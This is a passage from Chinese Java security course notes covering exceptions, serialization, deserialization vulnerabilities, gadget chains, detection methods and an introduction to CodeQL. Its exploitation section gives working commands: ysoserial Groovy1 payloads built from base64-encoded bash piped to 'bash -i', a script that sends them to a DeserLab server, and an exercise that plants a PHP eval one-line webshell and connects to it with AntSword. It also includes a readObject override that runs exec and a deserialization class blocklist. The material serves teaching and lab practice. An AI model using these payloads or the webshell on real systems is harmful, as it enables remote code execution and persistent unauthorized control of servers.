如果没有找到匹配的异常类型，就会将异常向上传递到上层调⽤者。⽆论是否找到匹配的异常类型，finally 中的代码都会被执⾏到 ( 在该⽅法结束之前执⾏ )。

如果上层调⽤者也没有处理的了异常，就继续向上传递，⼀直到 main ⽅法也没有合适的代码处理异常，就会交给 JVM 来进⾏处理，此时程序就会异常终⽌。

java异常强制⽤户去考虑程序的强健性和安全性。当程序运⾏到某个⽅法可能会出现异常时，可以在当前⽅法中使⽤try - catch 语句捕获异常。

如果⼀个⽅法被覆盖的时候，则需要在他的上级⽅法中声明抛出相同异常或异常的⼦类。如果⽗类中抛出多个异常，则覆盖⽅法必须抛出那些异常的的⼀个⼦集，不能抛出新的异常。

## 第⼋节 Java序列化与反序列化                                                                                  

### ⼀、介绍                                                                                              

在Java中，**序列化**和**反序列化**是⼀种**将对象转换为字节流**和**将字节流转换为对象**的机制。

通过序列化，可以将**对象存储到⽂件**中、传输到⽹络上，或者在**分布式系统中进⾏对象的传递**。

### ⼆、原理   

#### Java序列化                                                                                        

Java序列化机制是基于对象的类结构进⾏的。

当⼀个对象需要被序列化时，Java会将其转换为**字节流**，包括**对象的数据和类**的信息。

这个字节流可以存储到⽂件中、传输到⽹络上，或者在分布式系统中传递给其他节点。

#### Java反序列化

反序列化是将字节流转换回对象的过程。

在反序列化过程中，Java会使⽤字节流中的信息重构对象，并将其重新加载到内存中。

#### Serializable接⼝

Java的序列化机制是通过实现`java.io.Serializable`**接⼝**来实现的。该接⼝是⼀个**标记接⼝**，没有任何⽅法定义。

只有实现了`Serializable`接⼝的类的对象才能被序列化。

### 三、序列化和反序列化的使⽤⽅法                                                                                   

#### 1.序列化对象                                                                                           

要将对象序列化，可以按照以下步骤进⾏操作：

-  实现`Serializable`接⼝：将要序列化的类实现Serializable接⼝。

-  创建`ObjectOutputStream`：创建⼀个ObjectOutputStream对象，⽤于将对象序列化为字节流。

-  写⼊对象：使⽤`writeObject()`⽅法将对象写⼊到输出流中。

-  关闭流：关闭输出流。

示例代码：

```JAVA
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;

class Person implements Serializable {
    private String name;
    private int age;

    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    public void setName(String name) {
        this.name = name;
    }

    public void setAge(int age) {
        this.age = age;
    }

    public String getName() {
        return name;
    }

    public int getAge() {
        return age;
    }

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                '}';
    }

}

public class SerializationExample {
    public static void main(String[] args) {
        Person person = new Person("kevin", 20);

        try {
            FileOutputStream fos = new FileOutputStream("person.txt");
            ObjectOutputStream oos = new ObjectOutputStream(fos);
            oos.writeObject(person);
            oos.close();
            fos.close();
        }catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

#### 2.反序列化对象                                                                                                      

要将字节流反序列化为对象，可以按照以下步骤进⾏操作：

-  创建`ObjectInputStream`：创建⼀个`ObjectInputStream`对象，⽤于**从字节流中读取对象**。

-  读取对象：使⽤`readObject()`⽅法从输⼊流中读取对象。
   
-  关闭流：关闭输⼊流。

示例代码：

```JAVA
import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;

public class DeserializationExample {
    public static void main(String[] args) {
        try {
            FileInputStream fis = new FileInputStream("person.txt");
            ObjectInputStream ois = new ObjectInputStream(fis);
            Person person = (Person) ois.readObject();
            ois.close();
            fis.close();
            System.out.println(person);
            System.out.println(person.getName());
            System.out.println(person.getAge());
            person.setAge(22);
            person.setName("Scan");
            System.out.println(person);
        }catch (IOException | ClassNotFoundException e) {
            e.printStackTrace();
        }
    }
}
```

#### 3.使⽤场景                                                                                                        

##### (1)持久化存储                                                                                                      

通过序列化，可以将对象存储到⽂件中，实现持久化存储。

这在很多场景下都是⾮常有⽤的，例如保存应⽤程序的配置信息、保存⽤户的数据等。

##### (2)⽹络传输                                                                                                       

序列化可以将对象转换为字节流，从⽽⽅便地在⽹络上进⾏传输。这在分布式系统、RPC调⽤等场景中⾮常常⻅。

通过序列化，可以将对象打包成字节流，发送到远程节点，然后在远程节点上进⾏反序列化，恢复为原始对象。

##### (3)缓存机制                                                                                                       

⼀些缓存系统使⽤序列化来存储和检索对象。

当需要将对象存储到缓存中或从缓存中读取对象时，可以将对象序列化为字节流，并将其存储在缓存系统中。

### 四、反序列化漏洞                                                                                                      

#### 1.漏洞原理                                                                                                        

当开发者**⾃定义实现Serializable**、添加⾃⼰的readObject()⽅法时，若`readObject()`⽅法内**代码逻辑存在缺陷**，则可能存在Java反序列化漏洞的⻛险。

如果此时Java服务的反序列化API允许外部⽤户使⽤，则会导致攻击者使⽤精⼼构造的payload来利⽤反序列化漏洞达到任意代码执⾏的⽬的。

#### 2.反序列化实验                                                                                                      

做⼀个简单的Java反序列化实验，示例代码：

```JAVA
import java.io.*;

public class DeserializationTest {
    public static void main(String[] args) {
        String name = "kevin";
        try {
            //实例化⼀个⽂件流输出对象
            FileOutputStream fos = new FileOutputStream("ser_test.txt");

            //实例化⼀个对象输出到⽂件流的对象
            ObjectOutputStream oos = new ObjectOutputStream(fos);
            //将字符串写⼊到⽂件流对象中
            oos.writeObject(name);

            //从⽂件ser_test.txt中读取内容到⽂件输⼊流中
            FileInputStream fis = new FileInputStream("ser_test.txt");

            //将⽂件输⼊流传⼊对象输⼊流中
            ObjectInputStream ois = new ObjectInputStream(fis);

            //通过反序列化恢复对象name，并传值给otherName
            String otherName = (String) ois.readObject();
            System.out.println("otherName: " + otherName);

            //关闭所有流
            oos.close();
            fos.close();
            fis.close();
            ois.close();

        } catch (Exception e) {
            System.out.println(e.getMessage());
        }

    }

}
```

就这样，⼀个完整的序列化周期就完成了，其实实际应⽤中的序列化⽆⾮就是传输的⽅式和传输机制稍微复杂⼀点，和这个demo没有太⼤区别。

#### 3.readObject()⽅法重写测试                                                                                          

```JAVA
private void readObject(ObjectInputStream ois) throws Exception {
    ois.defaultReadObject();
    Runtime.getRuntime().exec("calc");
}
```

![image-20240918101346008](https://image.201068.xyz/assets/32.JAVA/image-20240918101346008.png)

![image-20240918101332415](https://image.201068.xyz/assets/32.JAVA/image-20240918101332415.png)

上⾯的demo就是⼀个对反序列化完全没有进⾏安全审查的示例，但实际⼯作场景不会有程序员会写出这种**弱智代码**。

因此开发时产⽣的反序列化漏洞常⻅的有以下⼏种情况：

-  重写`ObjectInputStream`对象的`resolveClass`⽅法中的检测可被绕过。

-  引⽤**第三⽅存在漏洞的依赖库**，例如：`apache.commons.collections`、`codehaus.groovy.runtime`、`springframework.bean`等
   
-  使⽤**第三⽅的类**进⾏**⿊名单控制**。

   虽然Java的语⾔严谨性要⽐PHP强的多，但在⼤型应⽤中想要采⽤⿊名单机制禁⽤掉所有危险的对象⼏乎是不可能的。

   因此，如果在审计过程中发现了采⽤⿊名单进⾏过滤的代码，**多半存在⼀两个漏⽹之⻥可以利⽤**。

   并且采取⿊名单⽅式仅仅可能保证此刻的安全，若在后期添加了新的功能，就可能引⼊了新的漏洞利⽤⽅式。

   所以仅靠⿊名单是⽆法保证序列化过程的安全的。

#### 4.基础库中隐藏的反序列化漏洞                                                                                               

优秀的Java开发⼈员⼀般会按照安全编程规范进⾏编程，很⼤程度上减少了反序列化漏洞的产⽣。

并且⼀些成熟的Java框架⽐如`Spring MVC`、`Springboot`等，都有相应的防范反序列化的机制。

如果仅仅是开发失误，可能很少会产⽣反序列化漏洞，即使产⽣，其绕过⽅法、利⽤⽅式也较为复杂。

但其实，有很⼤⽐例的反序列化漏洞是因使⽤了不安全的基础库⽽产⽣的。

2015年由⿊客`Gabriel Lawrence`和`Chris Frohoff`发现的`Apache Commons Collections`类库直接影响了`WebLogic`、`WebSphere`、`JBoss`、`Jenkins`、`OpenNMS`等⼤型框架。直到今天该漏洞的影响仍未消散。

存在危险的基础库：

```JAVA
commons-fileupload 1.3.1
commons-io 2.4
commons-collections 3.1
commons-logging 1.2
commons-beanutils 1.9.2
org.slf4j:slf4j-api 1.7.21
com.mchange:mchange-commons-java 0.2.11
org.apache.commons:commons-collections 4.0
com.mchange:c3p0 0.9.5.2
org.beanshell:bsh 2.0b5
org.codehaus.groovy:groovy 2.3.9
org.springframework:spring-aop 4.1.4.RELEASE
```

某些**反序列化防护软件**便是通过**禁⽤以下类的反序列化**来保护程序：

```JAVA
'org.apache.commons.collections.functors.InvokerTransformer',
'org.apache.commons.collections.functors.InstantiateTransformer',
'org.apache.commons.collections4.functors.InvokerTransformer',
'org.apache.commons.collections4.functors.InstantiateTransformer',
'org.codehaus.groovy.runtime.ConvertedClosure',
'org.codehaus.groovy.runtime.MethodClosure',
'org.springframework.beans.factory.ObjectFactory',
'xalan.internal.xsltc.trax.TemplatesImpl'
```

#### 5.POP Gadgets                                                                                                 

POP Gadgets指的是在通过带⼊序列化数据，经过⼀系列调⽤的代码链，其中POP指的是Property-Oriented Programming，即⾯向属性编程，和逆向的ROP很相似，⾯向属性编程（Property-Oriented Programing）常⽤于上层语⾔构造特定调⽤链的⽅法，与⼆进制利⽤中的⾯向返回编程（Return-Oriented Programing）的原理相似，都是从现有运⾏环境中寻找⼀系列的代码或者指令调⽤，然后根据需求构成⼀组连续的调⽤链。在控制代码或者程序的执⾏流程后就能够使⽤这⼀组调⽤链做⼀些⼯作。

两者的不同之处在于ROP更关注底层，⽽POP只关注对象与对象之间的调⽤关系。

Gadgets是⼩⼯具的意思，POP Gadgets即为⾯向属性编程的利⽤⼯具、利⽤链。当我们确定了可以带⼊序列化数据的⼊⼝后，便是要寻找对应的POP链。

以上提到的基础库和框架恰恰提供了可导致命令执⾏ POP 链的环境，所以引⼊了⽤户可控的序列化数据，并使⽤了不安全的基本库，就意味着存在反序列化漏洞。

POP链，直⽩解释就是⼀种利⽤反序列化过程来构造的攻击载荷。

### 五、如何发现java反序列化漏洞                                                                                              

#### 1.⽩盒检测                                                                                                        

当持有程序源码时，可以采⽤这种⽅法，**全⽂检索**寻找漏洞。

反序列化操作⼀般应⽤在导⼊**模板⽂件、⽹络通信、数据传输、⽇志格式化存储、对象数据落磁盘或DB存储**等业务场景。

因此审计过程中重点关注这些功能板块。

流程如下：

① 通过检索源码中对反序列化函数的调⽤来静态寻找反序列化的输⼊点，可以搜索以下函数：

```java
ObjectInputStream.readObject
ObjectInputStream.readUnshared
XMLDecoder.readObject
Yaml.load
XStream.fromXML
ObjectMapper.readValue
JSON.parseObject
```

⼩数点前⾯是类名，后⾯是⽅法名。

② 确定了反序列化输⼊点后，再考察应⽤的`Class Path`中是否包含`Apache Commons Collections`等危险库（ `ysoserial`所⽀持的其他库亦可）。

③ 若不包含危险库，则查看⼀些涉及命令、代码执⾏的代码区域，防⽌程序员代码不严谨，导致bug。

④ 若包含危险库，则使⽤`ysoserial`进⾏攻击复现。

#### 2.⿊盒检测                                                                                                        

在⿊盒测试中并不清楚对⽅的代码架构，但仍然可以通过**分析⼗六进制数据块**，锁定某些存在漏洞的通⽤基础库（⽐如Apache Commons Collection）的调⽤地点，并进⾏数据替换，从⽽实现利⽤。

**序列化数据**通常以`AC ED`开始，之后的两个字节是版本号，**版本号**⼀般是`00 05`但在某些情况下可能是更⾼的数字。

为了理解反序列化数据样式，我们使⽤以下代码举例：

```JAVA
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class SerializeDemo {
    public static void main(String[] args) {
        Person person = new Person("kevin", 20);

        try {
            FileOutputStream fos = new FileOutputStream("person.hex");
            ObjectOutputStream oos = new ObjectOutputStream(fos);
            oos.writeObject(person);
            oos.close();
            fos.close();
        }catch (IOException e){
            System.out.printf(e.getMessage());
        }
    }

}

class Person implements Serializable {
    private String name;
    private int age;

    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    public String getName() {
        return name;
    }

    public int getAge() {
        return age;
    }

    @Override
    public String toString() {
        return "Person{" +
            "name='" + name + '\'' +
            ", age=" + age +
            '}';
    }

}
```

在终端命令⾏运⾏⼀下java⽂件，即可看到⽣成的`person.hex`⽂件，⽣成的person.hex序列化数据为（可⽤`Sublime`⼯具打开）：

```JAVA
aced 0005 7372 0019 636f 6d2e 7761 736a
2e63 6861 7074 6572 3038 2e50 6572 736f
6eaa 16f9 40ed 626f 3702 0002 4900 0361
6765 4c00 046e 616d 6574 0012 4c6a 6176
612f 6c61 6e67 2f53 7472 696e 673b 7870
0000 0014 7400 056b 6576 696e 
```

 AC ED 是常⻅序列化数据的开头4字节，`00 05` 是流数据的版本号，这是JDK中固定的序列化对象的开头数据，可以理解为标识符，程序根据这⼏个字节的内容就可以确定该⽂件的类型。

序列化数据信息是将对象信息按照⼀定规则组成的，那我们根据这个规则也可以逆向推测出数据信息中的数据类型等信息。

#### SerializationDumper

github：https://github.com/NickstaDB/SerializationDumper.git

下载：https://github.com/NickstaDB/SerializationDumper/releases/download/v1.14/SerializationDumper-v1.14.jar

使⽤⼯具-`SerializationDumper`读取`person.hex`  元数据

```shell
java -jar .\SerializationDumper-v1.13.jar -r .\person.txt
```



```bash
STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
      className
        Length - 16 - 0x00 10
        Value - chapter02.Person - 0x6368617074657230322e506572736f6e
      serialVersionUID - 0x3e ba ff ed 65 dc d4 fe
      newHandle 0x00 7e 00 00
      classDescFlags - 0x02 - SC_SERIALIZABLE
      fieldCount - 2 - 0x00 02
      Fields
        0:
          Int - I - 0x49
          fieldName
            Length - 3 - 0x00 03
            Value - age - 0x616765
        1:
          Object - L - 0x4c
          fieldName
            Length - 4 - 0x00 04
            Value - name - 0x6e616d65
          className1
            TC_STRING - 0x74
              newHandle 0x00 7e 00 01
              Length - 18 - 0x00 12
              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b
      classAnnotations
        TC_ENDBLOCKDATA - 0x78
      superClassDesc
        TC_NULL - 0x70
    newHandle 0x00 7e 00 02
    classdata
      chapter02.Person
        values
          age
            (int)20 - 0x00 00 00 14
          name
            (object)
              TC_STRING - 0x74
                newHandle 0x00 7e 00 03
                Length - 5 - 0x00 05
                Value - kevin - 0x6b6576696e
```

### 六、利⽤反序列化漏洞                                                                                        

在这⾥，我们使⽤`DeserLab`来模拟实战环境。

DeserLab是⼀个使⽤了Groovy库的简单⽹络协议应⽤，实现client向server端发送序列化数据的功能，然后server端接收到client端发送的序列化数据后，对数据进⾏反序列化来读取内容。

⽽`Groovy`库和上⽂中提到的 `Apache Commons Collection` 库⼀样，含有可利⽤的POP链。

我们可以使⽤上⽂提到的`ysoserial`和**在线载荷⽣成器**进⾏模拟利⽤漏洞。

- ysoserial：https://github.com/frohoff/ysoserial
- 在线载荷⽣成器：https://jackson-t.com/java.lang.runtime.exec-payload-workarounds/

#### 环境准备

>    复现环境：
>
>    - CentOS 7
>
>    - python 2.7
>
>    - java 1.8
>
>
>    为什么使⽤Linux环境？
>
>    答：绝⼤多少企业的应⽤程序都会部署在Linux服务器环境下，使⽤Linux环境是为了更贴近真实情况。
>

```bash
scp DeserLab-v1.0.zip jdk-8u401-linux-x64.tar.gz deserlab_exploit.py ysoserial-all.jar root@192.168.70.14:/opt
```

![image-20240918110149050](https://image.201068.xyz/assets/32.JAVA/image-20240918110149050.png)

```bash
cd /opt
tar zxf jdk-8u401-linux-x64.tar.gz
unzip DeserLab-v1.0.zip

rpm -aq |grep openjdk
yum remove openjdk*
rpm -e --nodeps java-1.8.0-openjdk

vim /etc/profile

export JAVA_HOME=/opt/jdk1.8.0_401
export PATH=$JAVA_HOME/bin:$PATH
export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar

source /etc/profile
```

![image-20240918110002822](https://image.201068.xyz/assets/32.JAVA/image-20240918110002822.png)

#### 1.⽣成有效载荷                                                                                          

⾸先⽣成有效载荷，由于是在Linux环境下，所以使⽤Bash作为攻击载体。

```bash
bash -c {echo,bWtkaXIga2V2aW4=}|{base64,-d}|{bash,-i}
```

![image-20240918110250397](https://image.201068.xyz/assets/32.JAVA/image-20240918110250397.png)

#### 2.ysoserial⽣成payload                                                                              

⽤ysoserial⽣成针对`Groovy`库的payload：

```bash
java -jar ysoserial-all.jar Groovy1 "bash -c {echo,bWtkaXIga2V2aW4=}|{base64,-d}|{bash,-i}" >payload.hex
```

![image-20240918110601129](https://image.201068.xyz/assets/32.JAVA/image-20240918110601129.png)

#### 3.启动DeserLab服务端                                                                                   

在终端使⽤DeserLab.jar开启本地服务端：

```bash
java -jar /opt/DeserLab-v1.0/DeserLab.jar -server 127.0.0.1 6666
```

![image-20240918111016865](https://image.201068.xyz/assets/32.JAVA/image-20240918111016865.png)

#### 4.执⾏payload                                                                                       

使⽤使⽤deserlab_exploit.py脚本执⾏payload，向服务端发送序列化数据：

```python
python deserlab_exploit.py 127.0.0.1 6666 payload.hex
```

![image-20240918111541953](https://image.201068.xyz/assets/32.JAVA/image-20240918111541953.png)

Python执⾏脚本完毕后，会在DeserLab.jar同级⽬录下产⽣kevin ⽂件夹，这是由于payload成功带⼊了shell命令，并且服务端在反序列化的时候，成功执⾏了shell命令。

```JAVA
cd /opt/DeserLab-v1.0;ls
```

![image-20240918112108703](https://image.201068.xyz/assets/32.JAVA/image-20240918112108703.png)

>    为什么有的命令不能执⾏？例如：ls > dir_list
>
>    这是因为重定向和管道字符的使⽤⽅式在运⾏中的进程的上下⽂中没有意义。
>
>    我们的⽬的是将⽬录的列表输出到名为dir_list的⽂件中，但在exec()函数的上下⽂中，该命令会被解释为获取>和dir_list两个⽬录的列表。
>
>    其他时候，带有空格的参数会被String Tokenizer类打断，该类是专⻔⽤来分析字符串的类，位于java.util包中，该类可以将字符串分解为独⽴使⽤的单词，并称之为语⾔符号。

#### 5.ysoserial⼯具库                                                                                    

在上⾯的实战中，我们使⽤到ysoserial⼯具库中的`Groovy1`类型的payload，那么这个⼯具库中都⽀持⽣成哪些payload类型，我们通过它的帮助信息去了解⼀下。

```bash
java -jar ysoserial-all.jar
ls /opt/DeserLab-v1.0/lib
```



```java
[root@centos opt]# java -jar ysoserial-all.jar
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
  Available payload types:
九月 18, 2024 11:25:59 上午 org.reflections.Reflections scan
信息: Reflections took 121 ms to scan 1 urls, producing 18 keys and 153 values 
     Payload             Authors                                Dependencies                                                                                                                                                                                        
     -------             -------                                ------------                                                                                                                                                                                        
     AspectJWeaver       @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                                      
     BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5                                                                                                                                                                                           
     C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11                                                                                                                                                           
     Click1              @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0                                                                                                                                                         
     Clojure             @JackOfMostTrades                      clojure:1.8.0                                                                                                                                                                                       
     CommonsBeanutils1   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                                                                                               
     CommonsCollections1 @frohoff                               commons-collections:3.1                                                                                                                                                                             
     CommonsCollections2 @frohoff                               commons-collections4:4.0                                                                                                                                                                            
     CommonsCollections3 @frohoff                               commons-collections:3.1                                                                                                                                                                             
     CommonsCollections4 @frohoff                               commons-collections4:4.0                                                                                                                                                                            
     CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1                                                                                                                                                                             
     CommonsCollections6 @matthias_kaiser                       commons-collections:3.1                                                                                                                                                                             
     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1                                                                                                                                                                             
     FileUpload1         @mbechler                              commons-fileupload:1.3.1, commons-io:2.4                                                                                                                                                            
     Groovy1             @frohoff                               groovy:2.3.9                                                                                                                                                                                        
     Hibernate1          @mbechler                                                                                                                                                                                                                                  
     Hibernate2          @mbechler                                                                                                                                                                                                                                  
     JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                            
     JRMPClient          @mbechler                                                                                                                                                                                                                                  
     JRMPListener        @mbechler                                                                                                                                                                                                                                  
     JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                                        
     Jdk7u21             @frohoff                                                                                                                                                                                                                                   
     Jython1             @pwntester, @cschneider4711            jython-standalone:2.5.2                                                                                                                                                                             
     MozillaRhino1       @matthias_kaiser                       js:1.7R2                                                                                                                                                                                            
     MozillaRhino2       @_tint0                                js:1.7R2                                                                                                                                                                                            
     Myfaces1            @mbechler                                                                                                                                                                                                                                  
     Myfaces2            @mbechler                                                                                                                                                                                                                                  
     ROME                @mbechler                              rome:1.0                                                                                                                                                                                            
     Spring1             @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE                                                                                                                                               
     Spring2             @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2                                                                                                           
     URLDNS              @gebl                                                                                                                                                                                                                                      
     Vaadin1             @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14                                                                                                                                                          
     Wicket1             @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4 
```

从帮助信息可以看到，它包含了`Apache Commons Collections`（3.x和4.x）、`Spring Beans/Core`（4.x）和`Groovy`（2.3.x）等⼩⼯具链，

凡是使⽤了以上这些类库的java程序，都可以被视为包含反序列化漏洞的程序，

所以在今后对java程序审计中，可以利⽤这个⼯具对程序进⾏反序列化漏洞POC验证。

#### 练习：上传一句话木马

通过反序列化漏洞尝试给apache php环境上传一句话木马

##### 1.⽣成有效载荷

⾸先⽣成有效载荷，由于是在Linux环境下，所以使⽤Bash作为攻击载体。

```bash
echo '<?php @eval($_POST["xxx"]);?>' >/var/www/html/xxx.php

bash -c {echo,ZWNobyAnPD9waHAgQGV2YWwoJF9QT1NUWyJ4eHgiXSk7Pz4nID4vdmFyL3d3dy9odG1sL3h4eC5waHA=}|{base64,-d}|{bash,-i}
```

![image-20240918191906462](https://image.201068.xyz/assets/32.JAVA/image-20240918191906462-1726659568030-4.png)

##### 2.ysoserial⽣成payload 

⽤ysoserial⽣成针对`Groovy`库的payload：

```bash
java -jar ysoserial-all.jar Groovy1 "bash -c {echo,ZWNobyAnPD9waHAgQGV2YWwoJF9QT1NUWyJ4eHgiXSk7Pz4nID4vdmFyL3d3dy9odG1sL3h4eC5waHA=}|{base64,-d}|{bash,-i}" >xxx.hex
```

![image-20240918192052570](https://image.201068.xyz/assets/32.JAVA/image-20240918192052570-1726659568030-2.png)

##### 3.启动DeserLab服务端

在终端使⽤DeserLab.jar开启本地服务端：

```bash
java -jar /opt/DeserLab-v1.0/DeserLab.jar -server 127.0.0.1 6666
```

![image-20240918192120095](https://image.201068.xyz/assets/32.JAVA/image-20240918192120095-1726659568029-1.png)

##### 4.执⾏payload 

使⽤使⽤deserlab_exploit.py脚本执⾏payload，向服务端发送序列化数据：

```python
python deserlab_exploit.py 127.0.0.1 6666 xxx.hex
```

![image-20240918190047849](https://image.201068.xyz/assets/32.JAVA/image-20240918190047849-1726659568030-3.png)

![image-20240918192231618](https://image.201068.xyz/assets/32.JAVA/image-20240918192231618-1726659568030-6.png)

```bash
ls /var/www/html/
```

![image-20240918192306754](https://image.201068.xyz/assets/32.JAVA/image-20240918192306754-1726659568030-7.png)

http://192.168.70.14/xxx.php

![image-20240918192427902](https://image.201068.xyz/assets/32.JAVA/image-20240918192427902-1726659568030-5.png)

##### 5.蚁剑连接

```bash
http://192.168.70.14/xxx.php
xxx
```

![image-20240918192514923](https://image.201068.xyz/assets/32.JAVA/image-20240918192514923-1726659568030-8.png)

![image-20240918192531408](https://image.201068.xyz/assets/32.JAVA/image-20240918192531408-1726659568030-9.png)



## 第九节 Java代码审计

### ⼀、什么是代码审计 

顾名思义就是检查源代码中的安全缺陷，检查程序源代码是否存在安全隐患，或者有编码不规范的地⽅，

通过⾃动化⼯具或者⼈⼯审查的⽅式，对程序源代码逐条进⾏检查和分析，发现这些源代码缺陷引发的安全漏洞，并提供代码修订措施和建议。

代码审计的主要⽬的是在软件发布前尽可能减少错误，提⾼软件的安全性和稳定性。这⼀过程可能涉及使⽤⾃动化⼯具或⼿动审查源代码，以检查安全缺陷、性能瓶颈、代码结构问题等。

例如，在安全⽅⾯，代码审计可能涉及检测跨站脚本攻击(XSS)、SQL注⼊、代码注⼊、拒绝服务攻击(DoS)等安全漏洞，以及评估密码安全、会话管理 和权限控制等。

此外，代码审计还包括对第三⽅组件和开源库的审计，以确保它们的安全性和可靠性，并符合相关的法律法规和⾏业标准。通过代码审计，开发团队可以及时发现和解决代码中的问题，从⽽提升软件的整体质量。

### ⼆、CodeQL 

#### 1.简介 

CodeQL是⼀个源代码⽩盒审计⼯具，以⼀种⾮常新颖的⽅式组织代码与元数据，使研究⼈员能够“**像查询数据库⼀样检索代码**”，并发现其中的安全问题。

CodeQL的核⼼思想是使⽤数据流分析技术去发现代码中的潜在安全问题和漏洞，它可以在编译时或者运⾏时对代码进⾏分析，找出潜在的程序缺陷和安全隐患。CodeQL不仅⽀持多种编程语⾔，⽽且提供了⼤量的现成代码库和规则，使开发⼈员可以快速地构建和扩展⾃⼰的代码分析平台。

CodeQL是github的⼀个开源项⽬，是Github为了解决其托管的海量项⽬的安全性问题，收购了CodeQL的创业公司，并宣布开源了CodeQL的规则部分，这样全世界的安全⼯程师就可以贡献⾼效的QL审计规则给Github，帮助它解决托管项⽬的安全问题。

对于安全⼯程师，也就多了⼀个⾮商业的开源代码⾃动化审计⼯具。

CodeQL⽀持⾮常多的语⾔，在官⽹有如下⽀持的语⾔和框架列表。

#### 2.原理 

CodeQL是将代码转化成类似数据库的形式，并基于该database进⾏分析。

在 CodeQL 中，代码被视为数据。安全漏洞、Bug 和其他错误被建模为可以从代码中提取的数据库执⾏的查询。

> CodeQL 的整体思路是把源代码转化成⼀个可查询的数据库，通过 Extractor 模块对源代码⼯程进⾏关键信息分析提取，构成关系型数据库。CodeQL 的数据库并没有使⽤现有的数据库技术，⽽是⼀套基于⽂件的⾃⼰的实现。
>
> 对于编译型语⾔，Extractor 会监控编译过程，编译器每处理⼀个源代码⽂件，它都会收集源代码的相关信息，如：语法信息（AST 抽象语法树）、语意信息（名称绑定、类型信息、运算操作等），控制流、数据流等，同时也会复制⼀份源代码⽂件。
>
> ⽽对于解释性语⾔，Extractor 则直接分析源代码，得到类似的相关信息。
>
> 关键信息提取完成后，所有分析所需的数据都会导⼊⼀个⽂件夹，这个就是 CodeQL database, 其中包括了源代码⽂件、关系数据、语⾔相关的 database schema（schema 定义了数据之间的相互关系）。
>

#### 3.安装

CodeQL本身包含两部分：**解析引擎 + SDK**。

-  **解析引擎**：不开源，解析我们编写的规则，但是可以直接**在官⽹下载⼆进制⽂件**直接使⽤。

-  **SDK(规则库)**：完全开源，⾥⾯包含⼤部分现成的漏洞规则，我们也可以利⽤其编写⾃定义规则。

##### 3.1安装解析引擎CodeQL CLI                                                                                           

CodeQL CLI⽤来创建和分析数据库。

下载地址：https://github.com/github/codeql-cli-binaries/releases/download/v2.17.0/codeql-win64.zip

在Java配套教学⼯具中有下载好的安装包`codeql-win64.zip` ，将`codeql-win64.zip` 解压之后的⽂件夹放在C盘根⽬录，并重命名为  `codeql` ，然后将 `C:\codeql` 加⼊系统环境变量中，⽅便灵活调⽤。

![image-20240918143833103](https://image.201068.xyz/assets/32.JAVA/image-20240918143833103.png)

执⾏codeql命令，如下图所示。

![image-20240918143910824](https://image.201068.xyz/assets/32.JAVA/image-20240918143910824.png)

##### 3.2下载规则库                                                                                                      

规则库中包含了必须的⼀些标准库（内置库）和⼀些查询样例。

CodeQL的标准库不像其他编程语⾔⼀样会与解释器同时安装，⽽是需要我们⼿动下载。

下载地址：https://github.com/github/codeql/archive/refs/tags/codeql-cli/latest.zip

在Java配套教学⼯具中有下载好的压缩包`codeql-codeql-cli-latest.zip` ，将解压后得到`codeql-codeql-cli-latest` ⽂件夹放到  `C:\codeql` ⽬录下，并重命名为`codeql-sdk` 。

![image-20240918144042439](https://image.201068.xyz/assets/32.JAVA/image-20240918144042439.png)

### 三、命令⾏项⽬审计

#### 1.确定项⽬源码                                                                                                      

虽然CodeQl的优点⾮常多，但也存在⼀个⽐较明显的缺点：不能直接通过打包好的程序进⾏代码审计。

当你得到的只是⼀个jar包，那么会⽐较棘⼿，因为现在市⾯上的反编译程序的反编译结构都不太满意，在我个⼈的使⽤体验中感觉idea算是最完美的了，但是还可能存在⼀些反编译问题，⽐如语法错误，最终可能导致编译过程中CodeQl解析的不准确。

所以这⾥提供两个思路：

-  直接审计源代码

-  将编译好的⽂件反编译后，再执⾏审计

在本节课中，我们将通过直接审计源代码去发现其中的漏洞。

github：https://github.com/JoyChou93/java-sec-code.git

源代码⽂件是Java配套教学⼯具包中的`java-sec-code-master.zip` ，将解压之后的⽂件夹放在C盘下并重命名为`C:\java-sec-code` 。

![image-20240918152117719](https://image.201068.xyz/assets/32.JAVA/image-20240918152117719.png)

#### 2.安装Maven

